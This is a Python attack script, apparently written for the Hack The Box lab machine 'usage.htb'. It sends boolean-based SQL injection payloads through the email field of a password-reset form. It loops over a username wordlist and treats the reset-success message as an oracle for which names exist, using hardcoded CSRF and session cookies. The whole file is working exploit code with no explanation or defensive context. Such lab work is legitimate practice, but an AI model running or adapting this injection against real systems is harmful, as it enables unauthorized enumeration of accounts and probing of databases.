import requests as req

url = 'http://usage.htb/forget-password'

with open('top-usernames-shortlist.txt', 'r') as file:
    for guss in file:
        data = f"_token=6EZmj0LWj4T2EGWcX4VyeGGkA0q5Ubjun8g0cYVx&email=' OR (EXISTS(SELECT 1 FROM users WHERE name = '{guss}'))-- -"
        headers = { 
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(data)),
            "DNT": "1",
            "Upgrade-Insecure-Requests": "1",
            }
        cookie = {"Cookie":"XSRF-TOKEN=eyJpdiI6ImF4aVRDcUxMTnAxVUhXVEJGcm83eHc9PSIsInZhbHVlIjoiK0lZMitMaDZ2aUZSSzl6ZkZ1Rkt5MTFXZG5sSGdERkhLUWJXS0NQeUd0bzZKeVZxL3FSWjYxSlBERGZYSThNSjhlM0ViVlBTbWNjRSsxOWJubHoxVUM4U1hLdW1TMDFRUkthNFcvYWVLVWFaNndIRXJKNGsxOENRRWN4eS9uS2wiLCJtYWMiOiI1ZjI5YTdhZTFhYWZmODBjNWFlNTQ5MWM5MzY0OWZlZDYyYTE0NTJiNzMzZjg3MDI4OThlYWQ4ZmY3OTAwMDRjIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkcycHdWNVd6S2ppSnpaTVFiN1oyakE9PSIsInZhbHVlIjoidk4rOGdGM09UQ3VzcmJXNFNTMHR1MkVJektQVHVpZWFtNzdGOUZWb1dEWjgwVno1NTEwdWVIWWxBUFk2QWJqb2J2VDBnRmo4TVV4RjlhdXFzbTFvTFhrd3RaZ3lLUGdNeGhWVEJGRmRkRTd1YzliWW5hckxkVVRFYTBxeUt5Z3QiLCJtYWMiOiI0MGIxMDI1ZWZlNGJhMTFmMWYzNzZiNTY5OGI4MWIxMDk2ZmEzMGNkNGMzMmU1MDIyYTg1OTIzZDU3MzQ1YzZiIiwidGFnIjoiIn0%3D"}
        res = req.post(url, data=data, headers=headers, cookies=cookie)
        print(res.text)
        if 'We have e-mailed your password reset link to' in res.text:
            print(guss)